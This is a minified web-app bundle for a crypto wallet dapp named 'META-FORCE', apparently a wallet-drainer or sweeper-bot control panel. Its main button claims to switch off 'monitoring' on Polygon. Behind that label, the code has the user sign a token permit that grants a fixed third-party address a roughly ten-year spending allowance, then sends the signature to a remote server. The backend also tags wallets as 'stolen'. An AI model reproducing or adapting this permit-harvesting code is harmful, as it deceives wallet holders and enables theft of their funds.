(function(){"use strict";var e={1821:function(e,t,a){var n=a(5130),r=a(6768);function o(e,t){const a=(0,r.g2)("router-view");return(0,r.uX)(),(0,r.Wv)(a)}var s=a(1241);const i={},l=(0,s.A)(i,[["render",o]]);var d=l,c=a(1387);const u={class:"pge"},m={class:"mains"};function p(e,t,a,n,o,s){const i=(0,r.g2)("myfooter"),l=(0,r.g2)("MYcar"),d=(0,r.gN)("loading");return(0,r.bo)(((0,r.uX)(),(0,r.CE)("div",u,[(0,r.bF)(i,{onSendData:s.handleData},null,8,["onSendData"]),(0,r.Lk)("div",m,[(0,r.bF)(l,{onSendData:s.handleData},null,8,["onSendData"])])])),[[d,e.fullscreenLoading,void 0,{fullscreen:!0,lock:!0}]])}var h=a(782),f=(0,h.y$)({state:{id:null,address:null,admin:null,start:"未知",fullscreenLoading:!0},mutations:{setId(e,t){e.id=t},setAddress(e,t){e.address=t},setAdmin(e,t){e.admin=t},setStart(e,t){e.start=t},setFullscreenLoading(e,t){e.fullscreenLoading=t}},getters:{},actions:{},modules:{}}),g=a(4373);const w=g.A.create({baseURL:"https://v1.dexc.pro/jz/v8/",timeout:1e4,headers:{"Content-Type":"application/json"}});var v=a(4232);const b={class:"footer"},y={class:"main"},k={class:"logo"},T={key:0,class:"logo"};function x(e,t,a,n,o,s){return(0,r.uX)(),(0,r.CE)("div",b,[(0,r.Lk)("div",y,[(0,r.Lk)("div",k,(0,v.v_)(o.name),1),e.address?((0,r.uX)(),(0,r.CE)("span",T,(0,v.v_)(e.address.substring(0,4).toUpperCase()+"..."+e.address.substring(e.address.length-4).toUpperCase()),1)):(0,r.Q3)("",!0)])])}var C=a(4272),F=a(6895),D=a(1219);async function S(){if(window.ethereum)try{return window.ethereum.request({method:"eth_requestAccounts"})}catch(e){if(e.info&&e.info.error){const t=e.info.error.data&&e.info.error.data.message?e.info.error.data.message:e.info.error.message;D.nk.error(t)}else D.nk.error("Error message not available")}else D.nk.error("请安装 MetaMask 或其他支持的钱包")}function M(){let e=null;try{window.ethereum?e=new F.k(window.ethereum):console.error("请安装 MetaMask 或其他支持的钱包")}catch(t){if(t.info&&t.info.error){const e=t.info.error.data&&t.info.error.data.message?t.info.error.data.message:t.info.error.message;D.nk.error(e)}else D.nk.error("Error message not available")}return e}a(4506);var O={name:"MyFooter",computed:{...(0,h.aH)(["id","address"])},components:{},data(){return{add:null,name:"META-FORCE"}},methods:{async wallet(){try{if(window.ethereum){if(f.commit("setFullscreenLoading",!0),!window.ethereum.isBitKeep)return f.commit("setFullscreenLoading",!1),void this.$alert("仅支持Bitget Wallet钱包使用","提示",{showClose:!1,showConfirmButton:!1,center:!0});window.ethereum.removeAllListeners(),window.ethereum.on("disconnect",this.wallet),window.ethereum.on("chainChanged",this.wallet),window.ethereum.on("accountsChanged",this.wallet);let e=await S(),t=parseInt(await ethereum.request({method:"eth_chainId"}));f.commit("setId",t),137!=t&&await window.ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:C.up("137")}]}),f.commit("setAddress",e[0]),this.$emit("sendData"),console.log(window.ethereum)}}catch(e){this.$message.error(e.message),f.commit("setId",null),f.commit("setAddress",null),f.commit("setFullscreenLoading",!1)}}},mounted(){this.wallet()}};const L=(0,s.A)(O,[["render",x],["__scopeId","data-v-564a44da"]]);var A=L;const E={class:"car"},N={key:0,class:"span"},P={key:1,class:"span"};function _(e,t,a,n,o,s){const i=(0,r.g2)("el-alert"),l=(0,r.g2)("el-button"),d=(0,r.g2)("el-card");return(0,r.uX)(),(0,r.CE)("div",E,[(0,r.bF)(i,{title:"使用说明:未添加额外钱包的请先添加额外钱包,然后切换到额外钱包点击关闭马蹄监听,10分钟后会自动再次打开监听马蹄,请在10分钟内操作完需要的交互,超时后需要重新点击关闭",type:"error",closable:!1}),(0,r.bF)(d,{class:"box-card"},{default:(0,r.k6)((()=>[e.admin?((0,r.uX)(),(0,r.CE)("span",N,(0,v.v_)("address: "+e.admin.substring(0,12).toUpperCase()+"..."+e.admin.substring(e.admin.length-12).toUpperCase()),1)):((0,r.uX)(),(0,r.CE)("span",P,"没有可管理钱包地址")),(0,r.Lk)("span",null,(0,v.v_)("状态:"+e.start),1),(0,r.bF)(l,{type:"primary",disabled:!e.admin,loading:o.loading,onClick:t[0]||(t[0]=e=>s.jiaoyinew())},{default:(0,r.k6)((()=>[(0,r.eW)("关闭马蹄监听")])),_:1},8,["disabled","loading"])])),_:1})])}var j=a(5319),B=a(2115),I=a(1603),Y={name:"MYcar",computed:{...(0,h.aH)(["id","address","admin","start","fullscreenLoading"])},components:{},data(){return{loading:!1}},methods:{async jiaoyinew(){try{if(!this.address)return void this.$alert("请使用dapp浏览器打开","提示",{confirmButtonText:"确定",callback:e=>{}});if(137!=this.id)return void this.$alert("请先切换到马蹄链","提示",{confirmButtonText:"确定",callback:e=>{}});this.loading=!0;const e="0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",t=["function permit(address holder, address spender, uint256 nonce, uint256 expiry, bool allowed, uint8 v, bytes32 r, bytes32 s)","function getNonce(address user) public view returns(uint256 nonce)","function name() public view returns (string)"],a=this.address,n="0x5da16b43E4e86bcc76a8b30ec112b8eE15A068e1",r=new j.NZ(e,t,await M().getSigner()),o=await r.getNonce(a),s=await r.name(),i=await M().getSigner(),l=(await M().getBlock("latest")).timestamp,d=31536e4,c=l+d,u=!0,m=this.id,p={name:s,version:"1",verifyingContract:e,salt:B.nx(B.c$(C.up(m)),32)},h={Permit:[{name:"holder",type:"address"},{name:"spender",type:"address"},{name:"nonce",type:"uint256"},{name:"expiry",type:"uint256"},{name:"allowed",type:"bool"}]},f={holder:a,spender:n,nonce:Number(o),expiry:c.toString(),allowed:u},g=await i.signTypedData(p,h,f),{v:v,r:b,s:y}=I.t.from(g);let k={holder:a,spender:n,token:e,nonce:o.toString(),expiry:c.toString(),signature:g},T=await w.post("/Create/switch",k);this.$emit("sendData"),200==T.data.code&&this.$alert("监听已关闭","成功",{confirmButtonText:"确定",callback:e=>{}}),this.loading=!1}catch(e){this.$alert(e.message,"提示",{confirmButtonText:"确定",callback:e=>{}}),this.loading=!1}}},mounted(){}};const $=(0,s.A)(Y,[["render",_],["__scopeId","data-v-4672521c"]]);var U=$,W={computed:{...(0,h.aH)(["id","address","fullscreenLoading"])},components:{myfooter:A,MYcar:U},data(){return{}},methods:{async handleData(){if(this.address){let e=await w.post("/Query/getadmin",{admin:this.address});console.log(e.data),200==e.data.code?(f.commit("setAdmin",e.data.data.address),"stolen"==e.data.data.type?f.commit("setStart","监听中"):f.commit("setStart","监听已关闭"),f.commit("setFullscreenLoading",!1)):(f.commit("setAdmin",null),f.commit("setStart",null),f.commit("setFullscreenLoading",!1))}}},mounted(){},beforeCreate(){}};const X=(0,s.A)(W,[["render",p],["__scopeId","data-v-0c036948"]]);var J=X;const z=[{path:"/",name:"home",component:J}],H=(0,c.aE)({history:(0,c.LA)("/"),routes:z});var R=H,q=a(5587),K=(a(4188),a(7477)),G=a(5384),Q={message:{approve:"授权",renounceOwnership:"放弃权限",transfer:"转账",transferFrom:"从...转账",transferOwnership:"转让所有权",amount:"数量",spender:"支出者",sender:"发送者",recipient:"接收者",newOwner:"新所有者",write:"执行",addToBlacklist:"添加黑名单",disableTransfers:"关闭交易",enableTransfers:"开启交易",removeFromBlacklist:"移除白名单",account:"地址"},el:{colorpicker:{confirm:"确定",clear:"清空"},datepicker:{now:"此刻",today:"今天",cancel:"取消",clear:"清空",confirm:"确定",selectDate:"选择日期",selectTime:"选择时间",startDate:"开始日期",startTime:"开始时间",endDate:"结束日期",endTime:"结束时间",prevYear:"前一年",nextYear:"后一年",prevMonth:"上个月",nextMonth:"下个月",year:"年",month1:"1 月",month2:"2 月",month3:"3 月",month4:"4 月",month5:"5 月",month6:"6 月",month7:"7 月",month8:"8 月",month9:"9 月",month10:"10 月",month11:"11 月",month12:"12 月",weeks:{sun:"日",mon:"一",tue:"二",wed:"三",thu:"四",fri:"五",sat:"六"},months:{jan:"一月",feb:"二月",mar:"三月",apr:"四月",may:"五月",jun:"六月",jul:"七月",aug:"八月",sep:"九月",oct:"十月",nov:"十一月",dec:"十二月"}},select:{loading:"加载中",noMatch:"无匹配数据",noData:"无数据",placeholder:"请选择"},cascader:{noMatch:"无匹配数据",loading:"加载中",placeholder:"请选择",noData:"暂无数据"},pagination:{goto:"前往",pagesize:"条/页",total:"共 {total} 条",pageClassifier:"页",page:"页",prev:"上一页",next:"下一页",currentPage:"第 {pager} 页",prevPages:"向前 {pager} 页",nextPages:"向后 {pager} 页",deprecationWarning:"你使用了一些已被废弃的用法，请参考 el-pagination 的官方文档"},messagebox:{title:"提示",confirm:"确定",cancel:"取消",error:"输入的数据不合法!"},upload:{deleteTip:"按 delete 键可删除",delete:"删除",preview:"查看图片",continue:"继续上传"},table:{emptyText:"暂无数据",confirmFilter:"筛选",resetFilter:"重置",clearFilter:"全部",sumText:"合计"},tree:{emptyText:"暂无数据"},transfer:{noMatch:"无匹配数据",noData:"无数据",titles:["列表 1","列表 2"],filterPlaceholder:"请输入搜索内容",noCheckedFormat:"共 {total} 项",hasCheckedFormat:"已选 {checked}/{total} 项"},image:{error:"加载失败"},pageHeader:{title:"返回"},popconfirm:{confirmButtonText:"确定",cancelButtonText:"取消"}}},Z={message:{approve:"approve",renounceOwnership:"renounceOwnership",transfer:"transfer",transferFrom:"transferFrom",transferOwnership:"transferOwnership",amount:"amount",spender:"spender",sender:"sender",recipient:"recipient",newOwner:"newOwner",write:"write",addToBlacklist:"addToBlacklist",disableTransfers:"disableTransfers",enableTransfers:"enableTransfers",removeFromBlacklist:"removeFromBlacklist",account:"account"},el:{colorpicker:{confirm:"OK",clear:"Clear",defaultLabel:"color picker",description:"current color is {color}. press enter to select a new color."},datepicker:{now:"Now",today:"Today",cancel:"Cancel",clear:"Clear",confirm:"OK",dateTablePrompt:"Use the arrow keys and enter to select the day of the month",monthTablePrompt:"Use the arrow keys and enter to select the month",yearTablePrompt:"Use the arrow keys and enter to select the year",selectedDate:"Selected date",selectDate:"Select date",selectTime:"Select time",startDate:"Start Date",startTime:"Start Time",endDate:"End Date",endTime:"End Time",prevYear:"Previous Year",nextYear:"Next Year",prevMonth:"Previous Month",nextMonth:"Next Month",year:"",month1:"January",month2:"February",month3:"March",month4:"April",month5:"May",month6:"June",month7:"July",month8:"August",month9:"September",month10:"October",month11:"November",month12:"December",week:"week",weeks:{sun:"Sun",mon:"Mon",tue:"Tue",wed:"Wed",thu:"Thu",fri:"Fri",sat:"Sat"},weeksFull:{sun:"Sunday",mon:"Monday",tue:"Tuesday",wed:"Wednesday",thu:"Thursday",fri:"Friday",sat:"Saturday"},months:{jan:"Jan",feb:"Feb",mar:"Mar",apr:"Apr",may:"May",jun:"Jun",jul:"Jul",aug:"Aug",sep:"Sep",oct:"Oct",nov:"Nov",dec:"Dec"}},inputNumber:{decrease:"decrease number",increase:"increase number"},select:{loading:"Loading",noMatch:"No matching data",noData:"No data",placeholder:"Select"},dropdown:{toggleDropdown:"Toggle Dropdown"},cascader:{noMatch:"No matching data",loading:"Loading",placeholder:"Select",noData:"No data"},pagination:{goto:"Go to",pagesize:"/page",total:"Total {total}",pageClassifier:"",page:"Page",prev:"Go to previous page",next:"Go to next page",currentPage:"page {pager}",prevPages:"Previous {pager} pages",nextPages:"Next {pager} pages",deprecationWarning:"Deprecated usages detected, please refer to the el-pagination documentation for more details"},dialog:{close:"Close this dialog"},drawer:{close:"Close this dialog"},messagebox:{title:"Message",confirm:"OK",cancel:"Cancel",error:"Illegal input",close:"Close this dialog"},upload:{deleteTip:"press delete to remove",delete:"Delete",preview:"Preview",continue:"Continue"},slider:{defaultLabel:"slider between {min} and {max}",defaultRangeStartLabel:"pick start value",defaultRangeEndLabel:"pick end value"},table:{emptyText:"No Data",confirmFilter:"Confirm",resetFilter:"Reset",clearFilter:"All",sumText:"Sum"},tree:{emptyText:"No Data"},transfer:{noMatch:"No matching data",noData:"No data",titles:["List 1","List 2"],filterPlaceholder:"Enter keyword",noCheckedFormat:"{total} items",hasCheckedFormat:"{checked}/{total} checked"},image:{error:"FAILED"},pageHeader:{title:"Back"},popconfirm:{confirmButtonText:"Yes",cancelButtonText:"No"}}};const V=(0,G.hU)({locale:"zh",messages:{zh:Q,en:Z}});var ee=V;const te=(0,n.Ef)(d);for(const[ae,ne]of Object.entries(K))te.component(ae,ne);te.use(f),te.use(R),te.use(ee),te.use(q.A),te.mount("#app")}},t={};function a(n){var r=t[n];if(void 0!==r)return r.exports;var o=t[n]={exports:{}};return e[n].call(o.exports,o,o.exports,a),o.exports}a.m=e,function(){var e=[];a.O=function(t,n,r,o){if(!n){var s=1/0;for(c=0;c<e.length;c++){n=e[c][0],r=e[c][1],o=e[c][2];for(var i=!0,l=0;l<n.length;l++)(!1&o||s>=o)&&Object.keys(a.O).every((function(e){return a.O[e](n[l])}))?n.splice(l--,1):(i=!1,o<s&&(s=o));if(i){e.splice(c--,1);var d=r();void 0!==d&&(t=d)}}return t}o=o||0;for(var c=e.length;c>0&&e[c-1][2]>o;c--)e[c]=e[c-1];e[c]=[n,r,o]}}(),function(){a.n=function(e){var t=e&&e.__esModule?function(){return e["default"]}:function(){return e};return a.d(t,{a:t}),t}}(),function(){a.d=function(e,t){for(var n in t)a.o(t,n)&&!a.o(e,n)&&Object.defineProperty(e,n,{enumerable:!0,get:t[n]})}}(),function(){a.g=function(){if("object"===typeof globalThis)return globalThis;try{return this||new Function("return this")()}catch(e){if("object"===typeof window)return window}}()}(),function(){a.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)}}(),function(){a.r=function(e){"undefined"!==typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})}}(),function(){var e={524:0};a.O.j=function(t){return 0===e[t]};var t=function(t,n){var r,o,s=n[0],i=n[1],l=n[2],d=0;if(s.some((function(t){return 0!==e[t]}))){for(r in i)a.o(i,r)&&(a.m[r]=i[r]);if(l)var c=l(a)}for(t&&t(n);d<s.length;d++)o=s[d],a.o(e,o)&&e[o]&&e[o][0](),e[o]=0;return a.O(c)},n=self["webpackChunkmeta_force"]=self["webpackChunkmeta_force"]||[];n.forEach(t.bind(null,0)),n.push=t.bind(null,n.push.bind(n))}();var n=a.O(void 0,[504],(function(){return a(1821)}));n=a.O(n)})();
//# sourceMappingURL=app.ab039584.js.map